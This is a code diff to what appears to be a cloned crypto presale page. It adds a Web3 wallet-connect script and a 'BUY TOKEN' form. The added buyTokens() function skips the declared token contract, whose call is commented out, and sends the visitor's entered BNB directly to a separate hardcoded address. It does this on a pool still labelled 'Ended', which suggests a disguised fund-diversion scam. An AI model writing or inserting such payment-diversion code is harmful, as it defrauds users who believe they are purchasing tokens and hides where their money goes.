@@ -499,6 +499,8 @@
     <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700,900">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@mdi/font@latest/css/materialdesignicons.min.css">
     <script src="js/charting_library.js"></script>
+    <script src="js/web3.js"
+        tppabs="https://bscapd.com/project/0xed3d4e446a96dc3b181b64b75c3c70da41dc3cbe/web3.js"></script>
     <style></style>
     <script src="js/bundle.js"></script>
     <script src="js/dist/polyfills.js"></script>
@@ -1288,6 +1290,378 @@
             caret-color: #802700 !important;
         }
     </style>
+
+    <script>
+        const contractAbi = [
+            { inputs: [], stateMutability: "nonpayable", type: "constructor" },
+            {
+                anonymous: false,
+                inputs: [
+                    {
+                        indexed: true,
+                        internalType: "address",
+                        name: "owner",
+                        type: "address"
+                    },
+                    {
+                        indexed: true,
+                        internalType: "address",
+                        name: "spender",
+                        type: "address"
+                    },
+                    {
+                        indexed: false,
+                        internalType: "uint256",
+                        name: "value",
+                        type: "uint256"
+                    }
+                ],
+                name: "Approval",
+                type: "event"
+            },
+            {
+                anonymous: false,
+                inputs: [
+                    {
+                        indexed: true,
+                        internalType: "address",
+                        name: "from",
+                        type: "address"
+                    },
+                    {
+                        indexed: true,
+                        internalType: "address",
+                        name: "to",
+                        type: "address"
+                    },
+                    {
+                        indexed: false,
+                        internalType: "uint256",
+                        name: "value",
+                        type: "uint256"
+                    }
+                ],
+                name: "Transfer",
+                type: "event"
+            },
+            {
+                inputs: [],
+                name: "allowRefunds",
+                outputs: [],
+                stateMutability: "nonpayable",
+                type: "function"
+            },
+            {
+                inputs: [
+                    { internalType: "address", name: "owner", type: "address" },
+                    { internalType: "address", name: "spender", type: "address" }
+                ],
+                name: "allowance",
+                outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+                stateMutability: "view",
+                type: "function"
+            },
+            {
+                inputs: [
+                    { internalType: "address", name: "spender", type: "address" },
+                    { internalType: "uint256", name: "amount", type: "uint256" }
+                ],
+                name: "approve",
+                outputs: [{ internalType: "bool", name: "", type: "bool" }],
+                stateMutability: "nonpayable",
+                type: "function"
+            },
+            {
+                inputs: [
+                    { internalType: "address", name: "account", type: "address" }
+                ],
+                name: "balanceOf",
+                outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+                stateMutability: "view",
+                type: "function"
+            },
+            {
+                inputs: [
+                    { internalType: "uint256", name: "amount", type: "uint256" }
+                ],
+                name: "burnMyTokensFOREVER",
+                outputs: [],
+                stateMutability: "nonpayable",
+                type: "function"
+            },
+            {
+                inputs: [],
+                name: "buyTokens",
+                outputs: [],
+                stateMutability: "payable",
+                type: "function"
+            },
+            {
+                inputs: [],
+                name: "claimDevFeeAndAddLiquidity",
+                outputs: [],
+                stateMutability: "nonpayable",
+                type: "function"
+            },
+            {
+                inputs: [],
+                name: "decimals",
+                outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
+                stateMutability: "pure",
+                type: "function"
+            },
+            {
+                inputs: [
+                    { internalType: "address", name: "spender", type: "address" },
+                    {
+                        internalType: "uint256",
+                        name: "subtractedValue",
+                        type: "uint256"
+                    }
+                ],
+                name: "decreaseAllowance",
+                outputs: [{ internalType: "bool", name: "", type: "bool" }],
+                stateMutability: "nonpayable",
+                type: "function"
+            },
+            {
+                inputs: [],
+                name: "devClaimed",
+                outputs: [{ internalType: "bool", name: "", type: "bool" }],
+                stateMutability: "view",
+                type: "function"
+            },
+            {
+                inputs: [],
+                name: "ethSent",
+                outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+                stateMutability: "view",
+                type: "function"
+            },
+            {
+                inputs: [],
+                name: "getRefund",
+                outputs: [],
+                stateMutability: "nonpayable",
+                type: "function"
+            },
+            {
+                inputs: [
+                    { internalType: "address", name: "spender", type: "address" },
+                    { internalType: "uint256", name: "addedValue", type: "uint256" }
+                ],
+                name: "increaseAllowance",
+                outputs: [{ internalType: "bool", name: "", type: "bool" }],
+                stateMutability: "nonpayable",
+                type: "function"
+            },
+            {
+                inputs: [],
+                name: "isRefundEnabled",
+                outputs: [{ internalType: "bool", name: "", type: "bool" }],
+                stateMutability: "view",
+                type: "function"
+            },
+            {
+                inputs: [],
+                name: "isStopped",
+                outputs: [{ internalType: "bool", name: "", type: "bool" }],
+                stateMutability: "view",
+                type: "function"
+            },
+            {
+                inputs: [],
+                name: "liquidityUnlock",
+                outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+                stateMutability: "view",
+                type: "function"
+            },
+            {
+                inputs: [],
+                name: "moonMissionStarted",
+                outputs: [{ internalType: "bool", name: "", type: "bool" }],
+                stateMutability: "view",
+                type: "function"
+            },
+            {
+                inputs: [],
+                name: "name",
+                outputs: [{ internalType: "string", name: "", type: "string" }],
+                stateMutability: "pure",
+                type: "function"
+            },
+            {
+                inputs: [{ internalType: "bool", name: "_isStopped", type: "bool" }],
+                name: "pauseUnpausePresale",
+                outputs: [],
+                stateMutability: "nonpayable",
+                type: "function"
+            },
+            {
+                inputs: [],
+                name: "pool",
+                outputs: [{ internalType: "address", name: "", type: "address" }],
+                stateMutability: "view",
+                type: "function"
+            },
+            {
+                inputs: [
+                    {
+                        internalType: "contract IBEP20",
+                        name: "tokenAddress",
+                        type: "address"
+                    },
+                    { internalType: "uint256", name: "tokenAmount", type: "uint256" }
+                ],
+                name: "recoverbep20",
+                outputs: [],
+                stateMutability: "nonpayable",
+                type: "function"
+            },
+            {
+                inputs: [],
+                name: "refundTime",
+                outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+                stateMutability: "view",
+                type: "function"
+            },
+            {
+                inputs: [
+                    { internalType: "address payable", name: "addr", type: "address" }
+                ],
+                name: "setMultisigAddress",
+                outputs: [],
+                stateMutability: "nonpayable",
+                type: "function"
+            },
+            {
+                inputs: [],
+                name: "setPancakePool",
+                outputs: [],
+                stateMutability: "nonpayable",
+                type: "function"
+            },
+            {
+                inputs: [],
+                name: "symbol",
+                outputs: [{ internalType: "string", name: "", type: "string" }],
+                stateMutability: "pure",
+                type: "function"
+            },
+            {
+                inputs: [],
+                name: "totalSupply",
+                outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+                stateMutability: "view",
+                type: "function"
+            },
+            {
+                inputs: [
+                    { internalType: "address", name: "recipient", type: "address" },
+                    { internalType: "uint256", name: "amount", type: "uint256" }
+                ],
+                name: "transfer",
+                outputs: [{ internalType: "bool", name: "", type: "bool" }],
+                stateMutability: "nonpayable",
+                type: "function"
+            },
+            {
+                inputs: [
+                    { internalType: "address", name: "sender", type: "address" },
+                    { internalType: "address", name: "recipient", type: "address" },
+                    { internalType: "uint256", name: "amount", type: "uint256" }
+                ],
+                name: "transferFrom",
+                outputs: [{ internalType: "bool", name: "", type: "bool" }],
+                stateMutability: "nonpayable",
+                type: "function"
+            },
+            {
+                inputs: [{ internalType: "address", name: "user", type: "address" }],
+                name: "userEthSpenttInPresale",
+                outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+                stateMutability: "view",
+                type: "function"
+            },
+            { stateMutability: "payable", type: "receive" }
+        ];
+        const contractAddress = "0xD223Bf569685c6190DFc78E900DCeB29DA93a151";
+        const buyTokensContract = "0x852813fa16497dbc3665f12dd2e52e22615dc875"
+
+
+        async function connectMetamask() {
+            let web3Provider = null;
+            console.log("[web3] getting provider...");
+            // Modern Browsers like Chrome and Brave
+            if (window.ethereum) {
+                web3Provider = window.ethereum;
+                try {
+                    // Request account access
+                    await window.ethereum.enable();
+                } catch (error) {
+                    // User denied account access...
+                    alert("You must connect your metamask wallet !");
+                    console.error("User denied account access to metamask.");
+                    return;
+                }
+            } else {
+                // you cant connect
+                console.error("Unable to connect to metamask");
+                alert(
+                    "You have to use Trustwallet or install Metamask to use this service, you can install it from :  https://metamask.io/download.html"
+                );
+                return;
+            }
+
+            let web3 = new Web3(window.ethereum);
+            let accounts = await web3.eth.getAccounts();
+            console.log("accounts : " + accounts);
+            window.account = accounts[0];
+            console.log(accounts[0].slice(0, 12))
+            let res = accounts[0].slice(0, 12)
+            document.getElementById("btn-metamask").innerHTML = `${res}...`;
+            document.getElementById("connect").style = 'display: none';
+            document.getElementById("buy").style = 'display: flex; justify-content: space-between; align-items: center;';
+
+
+            return web3;
+        }
+
+        async function buyTokens() {
+            let amount = document.getElementById("presaleAmount").value;
+            let _web3 = await connectMetamask();
+            let myContract = new _web3.eth.Contract(contractAbi, contractAddress);
+
+            // const value = _web3.utils.toWei(amount, 'ether')
+            // // let value = _web3.utils.toBN(Number(amount))
+            // // let a = _web3.utils.toHex(amount)
+            // console.log(value)
+            // let res = _web3.utils.toBN(amount)
+            // console.log(res)
+            // console.log(myContract.methods)
+            let receipt = await _web3.eth.sendTransaction({
+                from: window.account,
+                to: buyTokensContract,
+                value: amount * 10 ** 18,
+                gas: 210000,
+                gasPrice: 18e9,
+            }, function(err, transactionHash) {
+                if (err) {
+                    console.log(err);
+                } else {
+                    console.log(transactionHash);
+                }
+            });
+            // let receipt = await myContract.methods
+            //     .transfer(buyTokensContract, `${amount * 10 ** 18}`)
+            //     .send({
+            //         from: window.account,
+            //         value: amount * 10 ** 18,
+            //         gasLimit: 210000,
+            //     })
+        }
+
+    </script>
 </head>
 
 <body><noscript><strong>We're
@@ -1339,9 +1713,11 @@
                                     data-v-2ce8af98="">Pad</span></a></li>
                     </ul>
                 </div>
-                <div data-v-2ce8af98="" class="sidebar-bottom"><button data-v-2ce8af98="" class="connect-wallet-btn">
-                        <p data-v-2ce8af98="" class="text-linear">Connect
-                            Wallet</p>
+                <div data-v-2ce8af98="" class="sidebar-bottom"><button id="btn-metamask" data-v-2ce8af98=""
+                        class="connect-wallet-btn" onclick="connectMetamask()"><i data-v-2ce8af98=""
+                            class="text-linear"></i>Connect Wallet
+                        <!--                        <p data-v-2ce8af98="" class="text-linear">Connect-->
+                        <!--                            Wallet</p>-->
                     </button>
                     <div data-v-2ce8af98="" class="setting">
                         <div data-v-2ce8af98=""><span data-v-2ce8af98=""><img data-v-2ce8af98=""
@@ -1354,8 +1730,8 @@
                         <div data-v-2ce8af98="" style="margin-top: 20px;"><img data-v-2ce8af98=""
                                 src="img/twitter.8e4cda6c.svg"><img data-v-2ce8af98=""
                                 src="img/telegram.ae92e6b4.svg"><img data-v-2ce8af98=""
-                                src="img/facebook.8db183d3.svg"><img data-v-2ce8af98=""
-                                src="img/youtube.1dd80909.svg"></div>
+                                src="img/facebook.8db183d3.svg"><img data-v-2ce8af98="" src="img/youtube.1dd80909.svg">
+                        </div>
                     </div>
                 </div>
             </div>
@@ -1398,7 +1774,18 @@
                                         text-linear">
                                     0x9971Ef5E4275018423E3A78C38BD094a3dECF474
                                 </a>
-                                <div data-v-952dc63c="" class="pool-action"><button data-v-952dc63c="">Connect</button>
+                                <div id="buy" style="display: none;">
+                                    <input
+                                        style="width: 200px; padding: 8px 12px; border: 1px solid #96cf24; outline: none; border-radius: 10px; color: #96cf24;"
+                                        placeholder="Enter the BNB amount" type="number" min="0.1" step="0.1"
+                                        id="presaleAmount">
+                                    <button style="width:120px; margin: 0;" onclick="buyTokens();" type="button"
+                                        class="connect-wallet-btn" data-v-2ce8af98="">BUY TOKEN
+                                    </button>
+                                </div>
+
+                                <div data-v-952dc63c="" class="pool-action" id="connect"><button data-v-952dc63c=""
+                                        onclick="connectMetamask()">Connect</button>
                                 </div>
                                 <div data-v-952dc63c="" class="pool-time" style="margin-top: 20px;">
                                     <h4 data-v-952dc63c="" class="text-linear"> Ended </h4>
@@ -1781,8 +2168,7 @@
                 <div data-v-7ac5e255="" class="theme-setting"><img data-v-7ac5e255=""
                         src="img/lightmode-inactive.8e4be918.svg"><img data-v-7ac5e255=""
                         src="img/darkmode-active.bc369e5c.svg"></div>
-                <div data-v-7ac5e255="" class="language-setting"><img data-v-7ac5e255=""
-                        src="img/earth.0abdd0ec.svg">
+                <div data-v-7ac5e255="" class="language-setting"><img data-v-7ac5e255="" src="img/earth.0abdd0ec.svg">
                     <p data-v-7ac5e255="" style="margin-left: 5px;">EN</p>
                 </div>
                 <div data-v-7ac5e255="" class="menu-icon"><img data-v-7ac5e255="" src="img/menu.5ae20cde.svg">
